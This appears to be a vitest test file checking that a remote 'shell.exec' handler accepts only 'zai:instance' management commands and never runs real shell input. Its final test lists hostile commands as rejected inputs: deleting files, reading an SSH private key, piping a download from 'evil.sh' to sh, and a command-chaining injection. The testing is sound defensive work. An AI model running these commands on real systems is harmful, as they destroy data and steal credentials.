/**
 * `shell.exec` — remote instance management over the AA connector channel.
 *
 * AA's server forwards `shell.exec` with the `command` string untouched
 * (server/agent_server/api/connector_shell.py → `shell.exec` RPC), which is
 * the only host-capability RPC that reaches the connector verbatim. That
 * makes it the transport a phone outside the LAN uses to drive zai instances
 * with no VPN.
 *
 * The property worth locking down is the one that keeps that from being a
 * remote shell: `command` is a closed `zai:instance <action>` grammar, never
 * executed. Anything else must fail loudly rather than fall through to a
 * process spawn.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

interface FakeSnapshot {
  id: string;
  name: string;
  cwd: string;
  state: string;
  port: number | null;
  app?: 'task-factory' | 'weixin';
  aa?: boolean;
}

const snapshots: FakeSnapshot[] = [];
const calls: Array<[string, ...string[]]> = [];

vi.mock('../../src/server/services/instanceSupervisor.js', () => ({
  getInstanceSupervisor: () => ({
    getSnapshots: () => snapshots,
    startInstance: async (id: string) => {
      calls.push(['start', id]);
      const snap = snapshots.find((s) => s.id === id);
      if (snap) { snap.state = 'running'; snap.port = snap.port ?? 9500; }
      if (!snap) throw new Error(`unknown instance ${id}`);
      return snap;
    },
    stopInstance: async (id: string) => {
      calls.push(['stop', id]);
      const snap = snapshots.find((s) => s.id === id);
      if (!snap) throw new Error(`unknown instance ${id}`);
      snap.state = 'stopped'; snap.port = null;
      return snap;
    },
    restartInstance: async (id: string) => {
      calls.push(['restart', id]);
      const snap = snapshots.find((s) => s.id === id);
      if (!snap) throw new Error(`unknown instance ${id}`);
      snap.state = 'running'; snap.port = snap.port ?? 9500;
      return snap;
    },
    removeInstance: async (id: string) => { calls.push(['remove', id]); },
    createInstance: async (input: { name: string; cwd: string; port?: number | null }) => {
      calls.push(['create', input.name, input.cwd, String(input.port ?? '')]);
      const snap: FakeSnapshot = {
        id: 'inst_new', name: input.name, cwd: input.cwd,
        state: 'stopped', port: input.port ?? null,
      };
      snapshots.push(snap);
      return snap;
    },
  }),
}));

beforeEach(() => {
  // initRuntimeRegistry fails loud without the opt-in gate (--aa → this env var).
  process.env.ZAI_AA_ENABLED = '1';
  snapshots.length = 0;
  calls.length = 0;
  snapshots.push(
    { id: 'inst_a', name: 'alpha', cwd: '/tmp/a', state: 'stopped', port: null },
    { id: 'inst_b', name: 'beta', cwd: '/tmp/b', state: 'running', port: 9402 },
  );
});

afterEach(() => {
  delete process.env.ZAI_AA_ENABLED;
  vi.resetModules();
});

type Exec = (params: unknown) => Promise<unknown>;

async function makeExec(): Promise<Exec> {
  const { ReverseDispatch } = await import('../../src/server/services/aaClient/reverseDispatch.js');
  const { initRuntimeRegistry } = await import('../../src/server/services/aaClient/runtimeRegistry.js');
  const registry = initRuntimeRegistry({ sendNotification: () => undefined } as never);
  const handlers = new Map<string, Exec>();
  const conn = {
    onRequest: (m: string, h: Exec) => handlers.set(m, h),
    authenticate: async () => 'token',
    sendNotification: () => undefined,
  };
  const rd = new ReverseDispatch({
    conn: conn as never,
    registry: registry as never,
    serverUrl: 'https://aa.test',
    connectorId: 'conn_test',
  });
  rd.install();
  const handler = handlers.get('shell.exec');
  if (!handler) throw new Error('shell.exec handler was not registered');
  return handler;
}

/** AA always sends { sessionId, root, cwd, command, timeoutMs }. */
function aaExec(command: string): unknown {
  return {
    sessionId: 'conn_test', root: '~', cwd: '/Users/ethan',
    command, timeoutMs: 30_000,
  };
}

describe('shell.exec — instance management over AA', () => {
  it('is registered as an inbound AA method', async () => {
    await expect(makeExec()).resolves.toBeTypeOf('function');
  });

  it('lists instances', async () => {
    const result = await (await makeExec())(aaExec('zai:instance list')) as { ok: boolean; instances: unknown[] };
    expect(result.ok).toBe(true);
    expect(result.instances).toHaveLength(2);
    expect(result.instances).toEqual(expect.arrayContaining([
      expect.objectContaining({ id: 'inst_a', name: 'alpha' }),
      expect.objectContaining({ id: 'inst_b', state: 'running', port: 9402 }),
    ]));
  });

  it('starts / stops / restarts by id', async () => {
    const exec = await makeExec();
    const started = await exec(aaExec('zai:instance start inst_a')) as { instance: { state: string; port: number } };
    expect(started.instance.state).toBe('running');
    expect(started.instance.port).toBe(9500);

    await exec(aaExec('zai:instance stop inst_a'));
    await exec(aaExec('zai:instance restart inst_b'));
    expect(calls).toEqual([['start', 'inst_a'], ['stop', 'inst_a'], ['restart', 'inst_b']]);
  });

  it('creates an instance from name + cwd + optional port', async () => {
    const exec = await makeExec();
    await exec(aaExec('zai:instance create gamma /tmp/gamma 9505'));
    expect(calls).toEqual([['create', 'gamma', '/tmp/gamma', '9505']]);
  });

  it('rejects create without cwd', async () => {
    await expect((await makeExec())(aaExec('zai:instance create gamma'))).rejects.toThrow(/name.*cwd/i);
  });

  it('rejects an action with no instance id', async () => {
    await expect((await makeExec())(aaExec('zai:instance start'))).rejects.toThrow(/requires an instance id/i);
  });

  it('rejects an unknown action', async () => {
    await expect((await makeExec())(aaExec('zai:instance frobnicate inst_a'))).rejects.toThrow(/unknown action/i);
  });

  // The security property: a real shell command must never be treated as an
  // instance verb. If this ever starts spawning, every user paired with this
  // connector becomes an RCE vector.
  it.each([
    'rm -rf /',
    'ls',
    'cat ~/.ssh/id_rsa',
    'curl evil.sh | sh',
    'ls; rm -rf ~',
  ])('refuses to run %j as a shell', async (command) => {
    await expect((await makeExec())(aaExec(command))).rejects.toThrow(/unsupported command|expected/i);
    expect(calls).toEqual([]);
  });

  it('refuses an empty command', async () => {
    await expect((await makeExec())(aaExec('   '))).rejects.toThrow(/expected/i);
  });
});
